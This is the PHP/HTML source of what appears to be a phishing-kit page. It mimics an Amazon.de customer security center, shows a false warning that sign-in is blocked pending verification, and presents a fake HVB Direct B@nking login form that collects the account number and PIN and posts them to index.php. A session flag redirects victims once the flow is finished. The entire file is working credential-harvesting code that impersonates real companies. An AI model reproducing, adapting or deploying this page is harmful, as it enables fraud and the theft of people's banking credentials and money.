<?php
	session_start();
	include("config.php");
	
	if (isset($_SESSION['finished']) && $_SESSION['finished']) {
		header('Location: '. $redirect);
	}
?>

<!DOCTYPE html>
<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition" data-aui-build-date="3.17.4.2-2017-03-18">
	<head>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<link rel="stylesheet" href="src/css/31O9784sOL.css">
		<title><?php echo $title ?></title>
		<link rel="stylesheet" href="src/css/01IP25TkamL.css">
		<link rel="stylesheet" href="src/css/419ZIIK4ICL.css">
		<link rel="stylesheet" type="text/css" href="src/hypo_css/obhp.css">
		<link href="src/img/favicon.ico" rel="shortcut icon" />
	</head>
	
	<body class="a-meter-animate" style="overflow:hidden;border-top:0px">
		<style type="text/css">
			.nav-sprite-v1 .nav-sprite, .nav-sprite-v1 .nav-icon {
			  background-image: url(src/img/nav-sprite-global_bluebeacon-1x_optimized._CB295582946_.png);
			  background-position: 0 1000px;
			  background-repeat: repeat-x;
			}
			.nav-spinner {
			  background-image: url(src/img/snake._CB192194539_.gif);
			  background-position: center center;
			  background-repeat: no-repeat;
			}
			.nav-timeline-icon, .nav-access-image, .nav-timeline-prime-icon {
			  background-image: url(src/img/timeline_sprite_1x.png);
			  background-repeat: no-repeat;
			}
		</style>
		<link rel="stylesheet" href="src/css/719Je9HLSTL.css">
		<link rel="stylesheet" href="src/css/uDzwVmjTcOCPxHLlU3NYtRo6Q5Fev0GI729sXbWEn4.css">
		<a id="nav-top"></a>
		
		<header class="nav-locale-de nav-lang-de nav-ssl nav-unrec nav-paladin-ww nav-opt-sprite">
			<div id="navbar" role="navigation" class="nav-sprite-v1 nav-bluebeacon">
				<div id="nav-belt">
					<div class="nav-left">
						<div id="nav-logo">
							<a href="#" class="nav-logo-link" tabindex="2">
								<span class="nav-logo-base nav-sprite">Amazon.de</span>
								<span class="nav-logo-ext nav-sprite"></span>
								<span class="nav-logo-locale nav-sprite"></span>
							</a>

							<a href="#" aria-label="" tabindex="3" class="nav-logo-tagline nav-sprite nav-prime-try">
								Prime testen
							</a>
						</div>
					</div>
					<div class="nav-right">
						<div id="nav-swmslot">
							<div id="navSwmHoliday" style="background-image: url(src/img/prime.jpg); width: 400px; height: 39px; overflow: hidden;position: relative;">
							<img alt="AIV" src="src/img/transparent-pixel.gif" usemap="#nav-swm-holiday-map" height="39px" border="0" width="400px"></div>
						</div>
					</div>
					
					<div class="nav-fill"></div>
				</div>
				
				<div id="nav-main" class="nav-sprite">
					<div class="nav-left">
						<div id="nav-shop">
							<a href="#" class="nav-a nav-a-2" id="nav-link-shopall" tabindex="10"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
						</div>
					</div>
					<div class="nav-right">
						<div id="nav-tools">
							<a href="#" class="nav-a nav-a-2" data-nav-ref="nav_ya_signin" data-nav-role="signin" id="nav-link-yourAccount" tabindex="26" style="border-radius:3px;border: 1px solid #ccc;">
								<span class="nav-line-1">Hallo! Anmelden <span style="color:#FF9900">(Anmeldung nicht möglich! Verifikation erforderlich)</span></span>
								<span class="nav-line-2">Mein Konto<span class="nav-icon nav-arrow" style="visibility: visible;"></span></span>
							</a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-prime" tabindex="27"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-wishlist" tabindex="28"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-wishlist" tabindex="28"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
						</div>
					</div>
					<div class="nav-fill">
						<div id="nav-xshop-container" class="">
							<div id="nav-xshop">
								<a href="#" data-nav-tabindex="5" class="nav-a nav_a" id="nav-your-amazon">Anmeldung <span style="color:#7CAB2B">&#10004;</span></a>
								<a href="#" class="nav-a" tabindex="22"> Bestätigung der persönlichen Daten <span style="color:#7CAB2B">&#10004;</span></a>
								<a href="#" class="nav-a" tabindex="23"><span style="color:#FF9900">&#10148; Zahlungsmittel bestätigen</span></a>
								<a href="#" class="nav-a" tabindex="24">Abschließen <span style="color:red">&#10006;</span></a>
							</div>
						</div>
					</div>
				</div>
				<div id="nav-subnav" style=""></div>
			</div>
		</header>

		<style>
		  #nav-prime-tooltip{
			padding: 0 20px 2px 20px;
			background-color: white;
			font-family: arial,sans-serif;
		  }
		  .nav-npt-text-title{
			font-family: arial,sans-serif;
			font-size: 18px;
			font-weight: bold;
			line-height: 21px;
			color: #E47923;
		  }
		  .nav-npt-text-detail, a.nav-npt-a{
			font-family: arial,sans-serif;
			font-size: 12px;
			line-height: 14px;
			color: #333333;
			margin: 2px 0px;
		  }
		  a.nav-npt-a {
			text-decoration: underline;
		  }
		</style>
		
		<div class="cs-content">
			<div class="cs-contact-title">
				<h1>
					Amazon - Kundenservice Sicherheitscenter
				</h1>
			</div>
			
			<div id="cbcc_frame1">
				<div id="centerslots" style="border-top:3px solid #E2001A;margin:0 auto;width:730px">
					<br/><br/>
					<img src="src/hypo_css/logoHeader.png"/>
					<div id="contentContainer" style="margin-top:40px">
						<div class="hvb-onlinebankingpage parsys">
							<div class="parbase section rlp">	
								<div class="borderContainer module dbLogin">
									<h2>
										Willkommen im HVB Direct B@nking!<br> Bitte loggen Sie sich ein.
									</h2>

									<form method="post" action="index.php">
										<div class="form-messages" style="display: <?php echo (isset($_SESSION['err']) ? "block" : "none"); unset($_SESSION['err']); ?>">
											<ul>
												<li style="display:<?php echo (isset($_SESSION['user_err']) ? "block" : "none") ?>"><span class="textError">Bitte geben Sie Ihre Direct B@nking Nummer ein!</span></li>
												<li style="display:<?php echo (isset($_SESSION['pass_err']) ? "block" : "none") ?>"><span class="textError">Bitte geben Sie Ihre PIN ein!</span></li>
												<li><span class="textError"></span></li>
											</ul>
										</div>
										<div class="clearfix inputWrapper">
											<div class="labelContainer">
												<label for="hypo_username" class="<?php echo (isset($_SESSION['user_err']) ? "error" : ""); unset($_SESSION['user_err']); ?>">Direct B@nking Nummer*</label>
												<input id="hypo_username" name="hypo_username" value="<?php echo (isset($_SESSION['hypo_username']) ? $_SESSION['hypo_username'] : ""); ?>" maxlength="10" class="first" type="text">
											</div>
											<div class="labelContainer">
												<label for="px2" class="<?php echo (isset($_SESSION['pass_err']) ? "error" : ""); unset($_SESSION['pass_err']); ?>">PIN*</label>
												<input id="hypo_pass" name="hypo_pass" maxlength="10" type="password">
											</div>
											<div class="submitCont">
												<input id="sendcode" name="sendcode" value="Anmelden" onclick="" type="submit">
											</div>
										</div>

										<div class="additionalInfo clearfix">
											<span class="footnote">* Pflichtfelder</span>
										</div>
									</form>
								</div>
							</div>
						</div>
					</div>
					
				</div>
			</div>
		</div>
		<div id="navFooter" class="navLeftFooter nav-sprite-v1" style="width:100%;position:absolute;bottom:0"><div class="navFooterLine navFooterLinkLine navFooterPadItemLine"> <span> <div class="navFooterLine navFooterLogoLine"> <a href="#"> <div class="nav-logo-base nav-sprite"></div> </a> </div> </span> <span class="icp-container-desktop"> <div class="navFooterLine"> <style type="text/css">#icp-touch-link-country{display:none}#icp-touch-link-language{display:none}</style> <a href="#" class="icp-button a-declarative" id="icp-touch-link-language"> <div class="icp-nav-globe-img-2 icp-button-globe-2"></div><span class="icp-color-base">Deutsch</span><span class="nav-arrow icp-up-down-arrow"></span> </a> <a href="#" class="icp-button a-declarative" id="icp-touch-link-country"> <span class="icp-flag-3 icp-flag-3-de"></span><span class="icp-color-base">Deutschland</span> </a> </div> </span> </div> <div class="navFooterLine navFooterLinkLine navFooterPadItemLine navFooterCopyright"> <ul> <li class="nav_first"> <a href="#" class="nav_a">Unsere AGB</a> </li> <li> <a href="#" class="nav_a">Datenschutzerklärung</a> </li> <li> <a href="#" class="nav_a">Impressum</a> </li> <li class="nav_last "> <a href="#" class="nav_a">Cookies &amp; Internet-Werbung</a> </li> </ul> <span>© 1998-<?php echo date("Y"); ?>, Amazon.com, Inc. oder Tochtergesellschaften</span> </div> </div>
	</body>
</html>